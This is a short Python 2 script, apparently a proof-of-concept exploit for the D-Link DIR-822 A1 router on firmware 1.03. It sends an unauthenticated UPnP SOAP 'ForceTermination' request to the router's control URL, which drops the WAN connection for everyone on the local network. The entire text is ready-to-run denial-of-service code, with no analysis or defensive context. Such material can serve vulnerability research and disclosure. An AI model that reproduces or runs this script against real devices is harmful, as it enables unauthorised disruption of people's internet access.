#For Dlink DIR-822 A1 1.03
#Unauthenticated UPNP action to terminate WAN connection on local network.
import urllib2

ctrl_url = "http://192.168.0.1:49152/soap.cgi?service=WANIPConn1"
service_type = "urn:schemas-upnp-org:service:WANIPConnection:1"
action_name = "ForceTermination"

soap_body = \
'<?xml version="1.0"?>\n' \
'<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">\n' \
'  <SOAP-ENV:Body>\n' \
'    <m:%(action_name)s xmlns:m="%(service_type)s">\n' \
'    </m:%(action_name)s>\n' \
'   </SOAP-ENV:Body>\n' \
'</SOAP-ENV:Envelope>\n' % {
    'action_name': action_name,
    'service_type': service_type,
}

soap_action = "urn:schemas-upnp-org:service:WANIPConnection:1#ForceTermination"
headers = {
    'SOAPAction': u'"%s"' % (soap_action),
    'Host': u'192.168.0.1:40833',
    'Content-Type': 'text/xml',
    'Content-Length': len(soap_body),
}

request = urllib2.Request(ctrl_url, soap_body, headers)
print urllib2.urlopen(request).read()
